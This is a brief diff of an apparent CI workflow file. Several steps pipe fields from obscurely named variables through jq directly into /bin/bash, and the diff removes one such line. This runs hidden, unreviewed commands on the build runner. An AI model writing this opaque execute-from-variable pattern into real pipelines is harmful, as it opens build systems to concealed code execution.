@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$xb76" | jq -r .bjg82 | /bin/bash
           printf '%s' "$vsbr1" | jq -r .fn922 | /bin/bash
           printf '%s' "$eeay611" | jq -r .e901 | /bin/bash
-          echo $qqmbq615 | jq -r .amve09050 | /bin/bash
           echo $osw5 | jq -r .t43 | /bin/bash
 
       - name: Save results
